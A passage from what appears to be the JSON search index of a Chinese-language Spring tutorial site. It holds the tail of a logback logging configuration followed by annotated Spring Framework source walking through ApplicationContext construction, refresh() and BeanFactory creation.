&lt;timeBasedFileNamingAndTriggeringPolicy class=\"ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP\"&gt;\n                &lt;maxFileSize&gt;5MB&lt;/maxFileSize&gt;\n            &lt;/timeBasedFileNamingAndTriggeringPolicy&gt;\n            &lt;maxHistory&gt;2&lt;/maxHistory&gt;\n        &lt;/rollingPolicy&gt;\n        &lt;layout class=\"ch.qos.logback.classic.PatternLayout\"&gt;\n            &lt;Pattern&gt;${CONSOLE_LOGBACK_PATTERN}&lt;/Pattern&gt;\n        &lt;/layout&gt;\n    &lt;/appender&gt;\n\n    &lt;appender name=\"INFO_FILE\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\"&gt;\n        &lt;File&gt;.log/ACANX-JavaWeb/LOG-INFO.log&lt;/File&gt;\n        &lt;filter class=\"ch.qos.logback.classic.filter.ThresholdFilter\"&gt;\n            &lt;level&gt;INFO&lt;/level&gt;\n            &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt;\n            &lt;onMismatch&gt;DENY&lt;/onMismatch&gt;\n        &lt;/filter&gt;\n        &lt;rollingPolicy class=\"ch.qos.logback.core.rolling.TimeBasedRollingPolicy\"&gt;\n            &lt;fileNamePattern&gt;.log/ACANX-JavaWeb/server-info-%d{yyyyMMdd}.log.%i&lt;/fileNamePattern&gt;\n            &lt;timeBasedFileNamingAndTriggeringPolicy class=\"ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP\"&gt;\n                &lt;maxFileSize&gt;5MB&lt;/maxFileSize&gt;\n            &lt;/timeBasedFileNamingAndTriggeringPolicy&gt;\n            &lt;maxHistory&gt;2&lt;/maxHistory&gt;\n        &lt;/rollingPolicy&gt;\n        &lt;layout class=\"ch.qos.logback.classic.PatternLayout\"&gt;\n            &lt;Pattern&gt;${CONSOLE_LOGBACK_PATTERN}&lt;/Pattern&gt;\n        &lt;/layout&gt;\n        &lt;encoder class=\"ch.qos.logback.classic.encoder.PatternLayoutEncoder\"&gt;\n            &lt;!--\u200b\u683c\u5f0f\u5316\u200b\u8f93\u51fa\u200b\uff1a%d\u200b\u8868\u793a\u200b\u65e5\u671f\u200b\uff0c%thread\u200b\u8868\u793a\u200b\u7ebf\u7a0b\u200b\u540d\u200b\uff0c%-5level\uff1a\u200b\u7ea7\u522b\u200b\u4ece\u200b\u5de6\u200b\u663e\u793a\u200b5\u200b\u4e2a\u5b57\u7b26\u200b\u5bbd\u5ea6\u200b%msg\uff1a\u200b\u65e5\u5fd7\u200b\u6d88\u606f\u200b\uff0c%n\u200b\u662f\u200b\u6362\u884c\u7b26\u200b--&gt;\n            &lt;pattern&gt;${CONSOLE_LOGBACK_PATTERN}&lt;/pattern&gt;\n        &lt;/encoder&gt;\n    &lt;/appender&gt;\n\n    &lt;appender name=\"TRACE_FILE\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\"&gt;\n        &lt;filter class=\"ch.qos.logback.classic.filter.ThresholdFilter\"&gt;\n            &lt;level&gt;TRACE&lt;/level&gt;\n            &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt;\n            &lt;onMismatch&gt;DENY&lt;/onMismatch&gt;\n        &lt;/filter&gt;\n        &lt;File&gt;.log/ACANX-JavaWeb/LOG-TRACE.log&lt;/File&gt;\n        &lt;rollingPolicy class=\"ch.qos.logback.core.rolling.TimeBasedRollingPolicy\"&gt;\n            &lt;fileNamePattern&gt;.log/ACANX-JavaWeb/server-TRACE-%d{yyyyMMdd}.log.%i\n            &lt;/fileNamePattern&gt;\n            &lt;timeBasedFileNamingAndTriggeringPolicy class=\"ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP\"&gt;\n                &lt;maxFileSize&gt;5MB&lt;/maxFileSize&gt;\n            &lt;/timeBasedFileNamingAndTriggeringPolicy&gt;\n            &lt;maxHistory&gt;2&lt;/maxHistory&gt;\n        &lt;/rollingPolicy&gt;\n        &lt;layout class=\"ch.qos.logback.classic.PatternLayout\"&gt;\n            &lt;Pattern&gt;${CONSOLE_LOGBACK_PATTERN}&lt;/Pattern&gt;\n        &lt;/layout&gt;\n    &lt;/appender&gt;\n\n    &lt;appender name=\"FULL_LEVEL_FILE\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\"&gt;\n        &lt;File&gt;.log/ACANX-JavaWeb/LOG-FULL.log&lt;/File&gt;\n        &lt;filter class=\"ch.qos.logback.classic.filter.ThresholdFilter\"&gt;\n            &lt;level&gt;TRACE&lt;/level&gt;\n        &lt;/filter&gt;\n        &lt;encoder&gt;\n            &lt;!--  \u200b\u6587\u4ef6\u540d\u200b [%file] --&gt;\n            &lt;pattern&gt;${CONSOLE_LOGBACK_PATTERN}&lt;/pattern&gt;\n        &lt;/encoder&gt;\n        &lt;rollingPolicy class=\"ch.qos.logback.core.rolling.TimeBasedRollingPolicy\"&gt;\n            &lt;fileNamePattern&gt;.log/ACANX-JavaWeb/LOG-FULL-%d{yyyyMMdd}.log.%i&lt;/fileNamePattern&gt;\n            &lt;timeBasedFileNamingAndTriggeringPolicy class=\"ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP\"&gt;\n                &lt;maxFileSize&gt;5MB&lt;/maxFileSize&gt;\n            &lt;/timeBasedFileNamingAndTriggeringPolicy&gt;\n            &lt;maxHistory&gt;2&lt;/maxHistory&gt;\n        &lt;/rollingPolicy&gt;\n        &lt;layout class=\"ch.qos.logback.classic.PatternLayout\"&gt;\n            &lt;Pattern&gt;${CONSOLE_LOGBACK_PATTERN}&lt;/Pattern&gt;\n        &lt;/layout&gt;\n    &lt;/appender&gt;\n\n    &lt;root level=\"TRACE\" additivity=\"true\"&gt;\n        &lt;appender-ref ref=\"CONSOLE\"/&gt;\n        &lt;appender-ref ref=\"WARN_FILE\"/&gt;\n        &lt;appender-ref ref=\"ERROR_FILE\"/&gt;\n        &lt;appender-ref ref=\"INFO_FILE\"/&gt;\n        &lt;appender-ref ref=\"TRACE_FILE\"/&gt;\n        &lt;appender-ref ref=\"FULL_LEVEL_FILE\"/&gt;\n    &lt;/root&gt;\n\n    &lt;!-- TRACE, DEBUG, INFO, WARN, ERROR, ALL \u200b\u548c\u200b OFF --&gt;\n    &lt;logger name=\"org\" level=\"TRACE\" additivity=\"true\"&gt;&lt;/logger&gt;\n    &lt;logger name=\"org.springframework.context\" level=\"TRACE\" additivity=\"false\"&gt;&lt;/logger&gt;\n    &lt;logger name=\"org.apache\" level=\"TRACE\"/&gt;\n    &lt;logger name=\"com.alibaba\" level=\"TRACE\"/&gt;\n    &lt;!-- \u200b\u5982\u679c\u200b\u8fd9\u91cc\u200b\u8bbe\u7f6e\u200b\u4e86\u200badditivity=true \u200b\u4ee3\u7801\u200b\u6253\u5370\u4fe1\u606f\u200b\u5411\u4e0a\u200b\u4f20\u9012\u200b,\u200b\u5c06\u200b\u6253\u5370\u4fe1\u606f\u200b\u4f20\u9012\u200b\u5230\u200broot \uff0c\u200b\u5e76\u4e14\u200b\u81ea\u5df1\u200b\u7684\u200bappender-ref \u200b\u4e5f\u200b\u4f1a\u200b\u6253\u5370\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u662f\u200b\u6253\u5370\u200b\u4e86\u200b\u4fe9\u200b\u6b21\u200b\u65e5\u5fd7\u200b--&gt;\n&lt;/configuration&gt;\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#3spring-ioc","title":"3.Spring IOC\u200b\u5bb9\u5668\u200b\u7684\u200b\u521b\u5efa","text":"","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#31-filesystemxmlapplicationcontextabstractxmlapplicationcontext","title":"3.1 \u200b\u8fdb\u5165\u200bFileSystemXmlApplicationContext\uff08AbstractXmlApplicationContext\u200b\u62bd\u8c61\u7c7b\u200b\u7684\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\u7c7b\u200b\uff09","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b: org.springframework.context.support.FileSystemXmlApplicationContext.java Java<pre><code>    public FileSystemXmlApplicationContext(String configLocation) throws BeansException {\n        this(new String[] {configLocation}, true, null);\n    }\n\n\n    // \u200b\u4e0a\u9762\u200b\u7684\u200bthis \u200b\u6765\u5230\u200b\u4e0b\u9762\u200b\u7684\u200b\u91cd\u8f7d\u200b\u6784\u9020\u65b9\u6cd5\u200b\n    public FileSystemXmlApplicationContext(\n            String[] configLocations, boolean refresh, @Nullable ApplicationContext parent)\n            throws BeansException {\n\n        super(parent);  // \u200b\u521d\u59cb\u5316\u200b\u7236\u200b\u5bb9\u5668\u200bAbstractApplicationContext\n        setConfigLocations(configLocations); // \u200b\u8bbe\u7f6e\u200b\u8d44\u6e90\u200b\u6587\u4ef6\u200b\u7684\u200b\u4f4d\u7f6e\u200b\n        if (refresh) {\n            refresh();// \u200b\u6838\u5fc3\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u5177\u4f53\u200b\u5b9a\u4e49\u200b\u5728\u200b\u8d85\u7c7b\u200bAbstractApplicationContext\uff08\u200b\u62bd\u8c61\u7c7b\u200b\uff09\u200b\u4e2d\u200b\uff0c\u200b\u662f\u200b\u4e00\u4e2a\u200b\u6a21\u677f\u200b\u65b9\u6cd5\u200b\n        }\n    }\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#32-abstractapplicationcontext","title":"3.2 \u200b\u521d\u59cb\u5316\u200b\u7236\u200b\u5bb9\u5668\u200bAbstractApplicationContext","text":"","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#321-abstractxmlapplicationcontextfilesystemxmlapplicationcontext","title":"3.2.1 AbstractXmlApplicationContext\u200b\u62bd\u8c61\u7c7b\u200b\uff08FileSystemXmlApplicationContext\u200b\u7684\u200b\u7236\u7c7b\u200b\uff09","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b: org.springframework.context.support.AbstractXmlApplicationContext.java Java<pre><code>    public AbstractXmlApplicationContext(@Nullable ApplicationContext parent) {\n        super(parent);\n    }\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#322-abstractrefreshableconfigapplicationcontext-abstractxmlapplicationcontext","title":"3.2.2 AbstractRefreshableConfigApplicationContext\u200b\u62bd\u8c61\u7c7b\u200b\uff08 AbstractXmlApplicationContext\u200b\u7684\u200b\u7236\u7c7b\u200b\uff09","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b:org.springframework.context.support.AbstractRefreshableConfigApplicationContext.java Java<pre><code>    public AbstractRefreshableConfigApplicationContext(@Nullable ApplicationContext parent) {\n        super(parent);\n    }\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#323-abstractrefreshableapplicationcontext","title":"3.2.3 AbstractRefreshableApplicationContext\u200b\u62bd\u8c61\u7c7b","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b:org.springframework.context.support.AbstractRefreshableApplicationContext.java Java<pre><code>    public AbstractRefreshableApplicationContext(@Nullable ApplicationContext parent) {\n        super(parent);\n    }\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#324-abstractapplicationcontext","title":"3.2.4 AbstractApplicationContext\u200b\u62bd\u8c61\u7c7b","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b:org.springframework.context.support.AbstractApplicationContext.java Java<pre><code>    public AbstractApplicationContext(@Nullable ApplicationContext parent) {\n        this();\n        setParent(parent);\n    }\n\n    //\u200b\u4e0a\u9762\u200b\u5bf9\u5e94\u200b\u7684\u200bthis()\u200b\u65b9\u6cd5\u200b \n    public AbstractApplicationContext() {\n        this.resourcePatternResolver = getResourcePatternResolver();\n    }\n\n    //\u200b\u4e0a\u9762\u200b\u5bf9\u5e94\u200b\u7684\u200b getResourcePatternResolver()\u200b\u65b9\u6cd5\u200b\n    protected ResourcePatternResolver getResourcePatternResolver() {\n        return new PathMatchingResourcePatternResolver(this);\n    }\n\n    // this()\u200b\u4e4b\u540e\u200b\u7684\u200bsetParent(parent);\u200b\u65b9\u6cd5\u200b\n    @Override\n    public void setParent(@Nullable ApplicationContext parent) {\n        this.parent = parent;\n        if (parent != null) {\n            Environment parentEnvironment = parent.getEnvironment();\n            if (parentEnvironment instanceof ConfigurableEnvironment) {\n                getEnvironment().merge((ConfigurableEnvironment) parentEnvironment);\n            }\n        }\n    }\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#35-pathmatchingresourcepatternresolver","title":"3.5 PathMatchingResourcePatternResolver\u200b\u7c7b","text":"<ul> <li>PathMatchingResourcePatternResolver(this)\u200b\u5bf9\u5e94\u200b\u7684\u200b\u6784\u9020\u65b9\u6cd5\u200b</li> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b:org.springframework.core.io.support.PathMatchingResourcePatternResolver.java Java<pre><code>    public PathMatchingResourcePatternResolver(ResourceLoader resourceLoader) {\n        Assert.notNull(resourceLoader, \"ResourceLoader must not be null\");\n        this.resourceLoader = resourceLoader;\n    }\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#4setconfiglocationsstring-locations","title":"4.setConfigLocations(String... locations) \u200b\u65b9\u6cd5","text":"<ul> <li>\u200b\u8bbe\u7f6e\u200b\u8d44\u6e90\u200b\u6587\u4ef6\u200b\u7684\u200b\u4f4d\u7f6e\u200b</li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#41-abstractrefreshableconfigapplicationcontextsetconfiglocationsnullable-string-locations","title":"4.1 AbstractRefreshableConfigApplicationContext.setConfigLocations(@Nullable String... locations) \u200b\u65b9\u6cd5","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b:org.springframework.context.support.AbstractRefreshableConfigApplicationContext.java Java<pre><code>    public void setConfigLocations(@Nullable String... locations) {\n        if (locations != null) {\n            Assert.noNullElements(locations, \"Config locations must not be null\");\n            this.configLocations = new String[locations.length];\n            for (int i = 0; i &lt; locations.length; i++) {\n                this.configLocations[i] = resolvePath(locations[i]).trim();\n            }\n        }\n        else {\n            this.configLocations = null;\n        }\n    }\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#5-refresh","title":"5. refresh()\u200b\u65b9\u6cd5","text":"<ul> <li>AbstractApplicationContext\u200b\u62bd\u8c61\u7c7b\u200b\u4e2d\u200b\u5b9a\u4e49\u200b\u7684\u200brefresh()\u200b\u6a21\u677f\u200b\u65b9\u6cd5\u200b</li> <li>\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u9700\u8981\u200b\u6267\u884c\u200b\u5237\u65b0\u200b\u64cd\u4f5c\u200b\u7684\u200b\u4e00\u4e9b\u200b\u6b65\u9aa4\u200b\uff0c\u200b\u53ea\u662f\u200b\u4e00\u4e2a\u200b\u6a21\u677f\u200b\uff0c\u200b\u4e2a\u6027\u5316\u200b\u7684\u200b\u903b\u8f91\u200b\u7531\u5176\u5b50\u200b\u7c7b\u6765\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b</li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#51-refresh","title":"5.1 refresh()\u200b\u65b9\u6cd5\u200b\u5b9a\u4e49","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b:org.springframework.context.support.AbstractApplicationContext.java Java<pre><code>@Override\npublic void refresh() throws BeansException, IllegalStateException {\n    synchronized (this.startupShutdownMonitor) {\n        // Prepare this context for refreshing.\n        prepareRefresh();\n\n        // Tell the subclass to refresh the internal bean factory.\n        // \u200b\u521b\u5efa\u200bBeanFactory\n        ConfigurableListableBeanFactory beanFactory = obtainFreshBeanFactory();\n\n        // Prepare the bean factory for use in this context.\n        prepareBeanFactory(beanFactory);\n\n        try {\n            // Allows post-processing of the bean factory in context subclasses.\n            postProcessBeanFactory(beanFactory);\n\n            // Invoke factory processors registered as beans in the context.\n            invokeBeanFactoryPostProcessors(beanFactory);\n\n            // Register bean processors that intercept bean creation.\n            registerBeanPostProcessors(beanFactory);\n\n            // Initialize message source for this context.\n            initMessageSource();\n\n            // Initialize event multicaster for this context.\n            initApplicationEventMulticaster();\n\n            // Initialize other special beans in specific context subclasses.\n            onRefresh();\n\n            // Check for listener beans and register them.\n            registerListeners();\n\n            // Instantiate all remaining (non-lazy-init) singletons.\n            // \u200b\u5b9e\u4f8b\u200b\u5316\u200bBean\n            finishBeanFactoryInitialization(beanFactory);\n\n            // Last step: publish corresponding event.\n            finishRefresh();\n        }\n\n        catch (BeansException ex) {\n            if (logger.isWarnEnabled()) {\n                logger.warn(\"Exception encountered during context initialization - \" +\n                        \"cancelling refresh attempt: \" + ex);\n            }\n\n            // Destroy already created singletons to avoid dangling resources.\n            destroyBeans();\n\n            // Reset 'active' flag.\n            cancelRefresh(ex);\n\n            // Propagate exception to caller.\n            throw ex;\n        }\n\n        finally {\n            // Reset common introspection caches in Spring's core, since we\n            // might not ever need metadata for singleton beans anymore...\n            resetCommonCaches();\n        }\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#52-preparerefresh","title":"5.2 prepareRefresh()\u200b\u65b9\u6cd5","text":"<ul> <li>\u200b\u6b63\u5f0f\u200bRefresh()\u200b\u64cd\u4f5c\u524d\u200b\u7684\u200b\u51c6\u5907\u200b\u5de5\u4f5c\u200b</li> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b:org.springframework.context.support.AbstractApplicationContext.java Java<pre><code>protected void prepareRefresh() {\n    // Switch to active.\n    this.startupDate = System.currentTimeMillis();\n    this.closed.set(false);\n    this.active.set(true);\n\n    if (logger.isDebugEnabled()) {\n        if (logger.isTraceEnabled()) {\n            logger.trace(\"Refreshing \" + this);\n        }\n        else {\n            logger.debug(\"Refreshing \" + getDisplayName());\n        }\n    }\n\n    // Initialize any placeholder property sources in the context environment.\n    initPropertySources();\n\n    // Validate that all properties marked as required are resolvable:\n    // see ConfigurablePropertyResolver#setRequiredProperties\n    getEnvironment().validateRequiredProperties();\n\n    // Store pre-refresh ApplicationListeners...\n    if (this.earlyApplicationListeners == null) {\n        this.earlyApplicationListeners = new LinkedHashSet&lt;&gt;(this.applicationListeners);\n    }\n    else {\n        // Reset local application listeners to pre-refresh state.\n        this.applicationListeners.clear();\n        this.applicationListeners.addAll(this.earlyApplicationListeners);\n    }\n\n    // Allow for the collection of early ApplicationEvents,\n    // to be published once the multicaster is available...\n    this.earlyApplicationEvents = new LinkedHashSet&lt;&gt;();\n}\n\n// \u200b\u4e0a\u8ff0\u200b\u5b9a\u4e49\u200b\u7684\u200binitPropertySources()\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u5177\u4f53\u200b\u7531\u200b\u5b50\u7c7b\u200b\u5b9e\u73b0\u200b\nprotected void initPropertySources() {\n    // For subclasses: do nothing by default.\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#53-obtainfreshbeanfactory","title":"5.3 obtainFreshBeanFactory()\u200b\u65b9\u6cd5","text":"<ul> <li>\u200b\u521b\u5efa\u200bBeanFactory\u200b\u7684\u200b\u6838\u5fc3\u200b\u65b9\u6cd5\u200b</li> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b:org.springframework.context.support.AbstractApplicationContext.java Java<pre><code>    protected ConfigurableListableBeanFactory obtainFreshBeanFactory() {\n        refreshBeanFactory();// \u200b\u5237\u65b0\u200bBeanFactory\uff0c\u200b\u62bd\u8c61\u200b\u65b9\u6cd5\u200b\u7531\u5176\u5b50\u200b\u7c7b\u200b\u5b9e\u73b0\u200b,5.3.1\u200b\u4e2d\u6709\u200b\u8bf4\u660e\u200b\n        return getBeanFactory();// \u200b\u83b7\u53d6\u200bBeanFactory\uff0c\u200b\u7236\u7c7b\u200b\u7684\u200b\u62bd\u8c61\u200b\u65b9\u6cd5\u200b\u7ee7\u627f\u200b\u5e76\u200b\u7531\u5176\u5b50\u200b\u7c7b\u200b\u5b9e\u73b0\u200b\n    }\n\n    protected abstract void refreshBeanFactory() throws BeansException, IllegalStateException;\n\n    @Override // \u200b\u8be5\u200b\u65b9\u6cd5\u200b\u5728\u200bConfigurableApplicationContext\u200b\u63a5\u53e3\u200b\u4e2d\u200b\u5b9a\u4e49\u200b\n    public abstract ConfigurableListableBeanFactory getBeanFactory() throws IllegalStateException;\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#531-refreshbeanfactory","title":"5.3.1 refreshBeanFactory()\u200b\u65b9\u6cd5\u200b\u7684\u200b\u4e00\u79cd\u200b\u5b9e\u73b0","text":"<ul> <li>org.springframework.context.support.AbstractRefreshableApplicationContext\u200b\u4e2d\u200b\u7684\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\u5982\u4e0b\u200b</li> <li>refreshBeanFactory()\u200b\u65b9\u6cd5\u200b\u662f\u200bAbstractApplicationContext\u200b\u4e2d\u200b\u5b9a\u4e49\u200b\u7684\u200b\u62bd\u8c61\u200b\u65b9\u6cd5\u200b</li> <li>AbstractRefreshableApplicationContext\u200b\u4e2d\u200b\u7684\u200brefreshBeanFactory()\u200b\u65b9\u6cd5\u200b\u662f\u200b\u8be5\u200b\u62bd\u8c61\u200b\u65b9\u6cd5\u200b\u7684\u200b\u4e00\u4e2a\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b</li> <li>\u200b\u4e3b\u8981\u200b\u4f5c\u7528\u200b\uff1a\u200b\u5237\u65b0\u200bBeanFactory Java<pre><code>// AbstractRefreshableApplicationContext\u200b\u4e2d\u200brefreshBeanFactory()\u200b\u65b9\u6cd5\u200b\u7684\u200b\u4e00\u79cd\u200b\u5b9e\u73b0\u200b\n@Override\nprotected final void refreshBeanFactory() throws BeansException {\n    // \u200b\u68c0\u67e5\u200b\u4e0a\u4e0b\u6587\u200b\u4e2d\u200b\u662f\u5426\u200b\u5df2\u200b\u5b58\u5728\u200bBeanFactory\n    if (hasBeanFactory()) {\n        // \u200b\u5b58\u5728\u200bBeanFactory\u200b\u65f6\u5148\u200b\u9500\u6bc1\u200b\u5df2\u200b\u5b58\u5728\u200b\u7684\u200bBeanFactory\n        destroyBeans();//\u200b\u8c03\u7528\u200bAbstractApplicationContext\u200b\u4e2d\u200b\u7684\u200b\u5b9e\u73b0\u200b\n        /**\n        * \u200b\u4ee5\u4e0b\u200b\u662f\u200bAbstractApplicationContext\u200b\u4e2d\u200bdestroyBeans()\u200b\u65b9\u6cd5\u200b\u7684\u200b\u5b9e\u73b0\u200b\n        * protected void destroyBeans() {\n        *    getBeanFactory().destroySingletons();\n        * }\n        */\n        closeBeanFactory();// \u200b\u8c03\u7528\u200b\u672c\u200b\u62bd\u8c61\u7c7b\u200b\u4e2d\u200b\u7684\u200bcloseBeanFactory()\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u5177\u4f53\u200b\u4ee3\u7801\u200b\u5728\u200b\u4e0b\u9762\u200b\u5217\u51fa\u200b\n    }\n    try {\n        // \u200b\u521b\u5efa\u200b\u65b0\u200b\u7684\u200bBeanFactory\n        // \u200b\u4e0b\u9762\u200b\u8fd9\u200b\u884c\u200b\u4ee3\u7801\u200b\u53ea\u4f1a\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u7a7a\u200b\u7684\u200bBeanFactory\uff0c\u200b\u5e76\u672a\u200b\u6709\u200b\u4efb\u4f55\u200bBean\n        DefaultListableBeanFactory beanFactory = createBeanFactory();\n        beanFactory.setSerializationId(getId());\n        customizeBeanFactory(beanFactory);\n        loadBeanDefinitions(beanFactory);// refreshBeanFactory()\u200b\u65b9\u6cd5\u200b\u5b9e\u73b0\u200b\u7684\u200b\u6838\u5fc3\u200b\n        synchronized (this.beanFactoryMonitor) {\n            this.beanFactory = beanFactory;\n        }\n    }\n    catch (IOException ex) {\n        throw new ApplicationContextException(\"I/O error parsing bean definition source for \" + getDisplayName(), ex);\n    }\n}\n\n// AbstractRefreshableApplicationContext\u200b\u62bd\u8c61\u7c7b\u200b\u4e2d\u200brefreshBeanFactory()\u200b\u65b9\u6cd5\u200b\u5185\u200b\u8c03\u7528\u200b\u7684\u200bcloseBeanFactory()\u200b\u65b9\u6cd5\u200b\n@Override\nprotected final void closeBeanFactory() {\n    synchronized (this.beanFactoryMonitor) {\n        if (this.beanFactory != null) {\n            //\u200b\u9500\u6bc1\u200b\u5df2\u200b\u5b58\u5728\u200b\u7684\u200bBeanFactory\n            this.beanFactory.setSerializationId(null);\n            this.beanFactory = null;\n        }\n    }\n}\n\n//AbstractRefreshableApplicationContext\u200b\u62bd\u8c61\u7c7b\u200b\u4e2d\u200brefreshBeanFactory()\u200b\u65b9\u6cd5\u200b\u5185\u200b\u8c03\u7528\u200bcreateBeanFactory()\u200b\u65b9\u6cd5\u200b\nprotected DefaultListableBeanFactory createBeanFactory() {\n    // \u200b\u8c03\u7528\u200b\u4e0b\u9762\u200b AbstractApplicationContext\u200b\u4e2d\u200b\u7684\u200bgetInternalParentBeanFactory()\u200b\u65b9\u6cd5\u200b\n    return new DefaultListableBeanFactory(getInternalParentBeanFactory());\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#abstractapplicationcontextgetinternalparentbeanfactory","title":"AbstractApplicationContext\u200b\u4e2d\u200b\u7684\u200bgetInternalParentBeanFactory()\u200b\u65b9\u6cd5","text":"Java<pre><code>@Nullable\nprotected BeanFactory getInternalParentBeanFactory() {\n    return (getParent() instanceof ConfigurableApplicationContext ?\n            ((ConfigurableApplicationContext) getParent()).getBeanFactory() : getParent());\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#defaultlistablebeanfactory","title":"DefaultListableBeanFactory\u200b\u7684\u200b\u6784\u9020\u65b9\u6cd5","text":"Java<pre><code>public DefaultListableBeanFactory(@Nullable BeanFactory parentBeanFactory) {\n    super(parentBeanFactory);// \u200b\u8c03\u7528\u200bAbstractAutowireCapableBeanFactory(\u200b\u62bd\u8c61\u7c7b\u200b)\u200b\u7684\u200b\u6784\u9020\u65b9\u6cd5\u200b\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#defaultlistablebeanfactoryabstractautowirecapablebeanfactory","title":"DefaultListableBeanFactory\u200b\u7236\u7c7b\u200bAbstractAutowireCapableBeanFactory(\u200b\u62bd\u8c61\u7c7b\u200b)\u200b\u7684\u200b\u6784\u9020\u65b9\u6cd5","text":"Java<pre><code>public AbstractAutowireCapableBeanFactory(@Nullable BeanFactory parentBeanFactory) {\n    this();\n    setParentBeanFactory(parentBeanFactory);\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#abstractrefreshableapplicationcontextcustomizebeanfactorybeanfactory","title":"AbstractRefreshableApplicationContext\u200b\u4e2d\u200b\u7684\u200bcustomizeBeanFactory(beanFactory)\u200b\u65b9\u6cd5","text":"Java<pre><code>protected void customizeBeanFactory(DefaultListableBeanFactory beanFactory) {\n    if (this.allowBeanDefinitionOverriding != null) {\n        beanFactory.setAllowBeanDefinitionOverriding(this.allowBeanDefinitionOverriding);\n    }\n    if (this.allowCircularReferences != null) {\n        beanFactory.setAllowCircularReferences(this.allowCircularReferences);\n    }\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#abstractrefreshableapplicationcontextloadbeandefinitionsbeanfactory","title":"AbstractRefreshableApplicationContext\u200b\u4e2d\u200b\u7684\u200bloadBeanDefinitions(beanFactory)\u200b\u65b9\u6cd5","text":"<ul> <li>\u200b\u662f\u200b\u5b9e\u73b0\u200brefreshBeanFactory()\u200b\u65b9\u6cd5\u200b\u7684\u200b\u6838\u5fc3\u200b</li> <li>org.springframework.context.support.AbstractRefreshableApplicationContext\u200b\u4e2d\u200b\u5b9a\u4e49\u200b\u7684\u200b\u62bd\u8c61\u200b\u65b9\u6cd5\u200b Java<pre><code>protected abstract void loadBeanDefinitions(DefaultListableBeanFactory beanFactory)\n        throws BeansException, IOException;\n</code></pre></li> <li>\u200b\u8be5\u200b\u62bd\u8c61\u200b\u65b9\u6cd5\u200b\u7684\u200b\u4e00\u4e2a\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\u5728\u200borg.springframework.context.support.AbstractXmlApplicationContext\u200b\u4e2d\u200b</li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#orgspringframeworkcontextsupportabstractxmlapplicationcontextloadbeandefinitionsdefaultlistablebeanfactory-beanfactory","title":"org.springframework.context.support.AbstractXmlApplicationContext\u200b\u4e2d\u200b\u7684\u200bloadBeanDefinitions(DefaultListableBeanFactory beanFactory)\u200b\u65b9\u6cd5","text":"<ul> <li>org.springframework.context.support.AbstractRefreshableApplicationContext\u200b\u4e2d\u200b\u5b9a\u4e49\u200b\u7684\u200b\u62bd\u8c61\u200b\u65b9\u6cd5\u200bloadBeanDefinitions(DefaultListableBeanFactory beanFactory)\u200b\u7684\u200b\u4e00\u4e2a\u200b\u5b9e\u73b0\u200b Java<pre><code>@Override\nprotected void loadBeanDefinitions(DefaultListableBeanFactory beanFactory) throws BeansException, IOException {\n    // Create a new XmlBeanDefinitionReader for the 